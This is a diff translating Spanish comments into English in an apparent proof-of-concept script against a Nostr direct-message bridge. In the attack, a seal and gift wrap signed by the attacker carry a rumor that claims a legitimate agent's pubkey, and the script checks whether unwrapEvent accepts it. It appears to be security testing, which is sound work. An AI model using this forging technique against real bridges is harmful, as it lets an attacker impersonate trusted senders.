@@ -17,10 +17,10 @@ const attackerPriv = generateSecretKey();
 const attackerPub = getPublicKey(attackerPriv);
 
 console.log('bridgePub      :', bridgePub.slice(0, 12) + '...');
-console.log('agente legitimo:', legitAgentPub.slice(0, 12) + '... (rumor declarará este)');
+console.log('legit agent:', legitAgentPub.slice(0, 12) + '... (rumor will declare this one)');
 console.log('atacante       :', attackerPub.slice(0, 12) + '... (firma el seal/wrap)\n');
 
-// 1) Rumor: kind 14, pubkey DECLARA ser el agente legitimo
+// 1) Rumor: kind 14, pubkey DECLARES being the legit agent
 const rumor = {
   kind: 14,
   created_at: Math.floor(Date.now() / 1000),
@@ -30,7 +30,7 @@ const rumor = {
 };
 rumor.id = require('nostr-tools').getEventHash(rumor);
 
-// 2) Seal: lo firma el ATACANTE (NO el dueño del rumor.pubkey). Cifrado para el bridge
+// 2) Seal: signed by the ATTACKER (NOT the owner of rumor.pubkey). Encrypted for the bridge
 const attackerConvKey = nip44.getConversationKey(attackerPriv, bridgePub);
 const seal = finalizeEvent({
   kind: 13,
@@ -39,7 +39,7 @@ const seal = finalizeEvent({
   tags: [],
 }, attackerPriv);
 
-// 3) Wrap: lo firma el ATACANTE, cifrado para el bridge
+// 3) Wrap: signed by the ATTACKER, encrypted for the bridge
 const wrap = finalizeEvent({
   kind: 1059,
   content: nip44.encrypt(JSON.stringify(seal), attackerConvKey),
@@ -54,22 +54,22 @@ console.log('wrap.pubkey (firmante del wrap)     :', wrap.pubkey.slice(0, 12) + 
 let unwrapped;
 try {
   unwrapped = unwrapEvent(wrap, bridgePriv);
-  console.log('\n[unwrapEvent] descifró el wrap malicioso (no lanzó error)');
+  console.log('\n[unwrapEvent] decrypted the malicious wrap (did not throw)');
   console.log('  rumor.pubkey :', unwrapped.pubkey.slice(0, 12) + '...');
   console.log('  content      :', JSON.stringify(unwrapped.content));
   const mismatch = unwrapped.pubkey !== seal.pubkey;
   console.log('\n  rumor.pubkey == seal.pubkey ?', mismatch ? 'NO (MISMATCH)' : 'SI');
   if (mismatch && unwrapped.pubkey === legitAgentPub) {
-    console.log('  >>> IMPOSTURA DEMOSTRADA: el rumor declara el agente legítimo,');
-    console.log('      el seal lo firmó el atacante, y unwrapEvent lo acepta.');
-    console.log('      El bridge haría agentByPubkey(rumor.pubkey) -> lo aceptaría');
-    console.log('      como DM del agente legítimo aunque lo envió el atacante.');
+    console.log('  >>> IMPOSTURE DEMONSTRATED: the rumor declares the legit agent,');
+    console.log('      the seal was signed by the attacker, and unwrapEvent accepts it.');
+    console.log('      The bridge would do agentByPubkey(rumor.pubkey) -> it would accept it');
+    console.log('      as a DM from the legit agent even though the attacker sent it.');
   } else if (mismatch) {
-    console.log('  >>> Hay mismatch pero NO suplanta un agente conocido.');
+    console.log('  >>> Mismatch but does NOT impersonate a known agent.');
   } else {
-    console.log('  >>> No hay mismatch. (?)');
+    console.log('  >>> No mismatch. (?)');
   }
 } catch (e) {
-  console.log('\n[unwrapEvent] FALLÓ:', e.message);
-  console.log('>>> El ataque NO trivial: unwrapEvent/verify rechazó el wrap malicioso.');
+  console.log('\n[unwrapEvent] FAILED:', e.message);
+  console.log('>>> The attack is NOT trivial: unwrapEvent/verify rejected the malicious wrap.');
 }
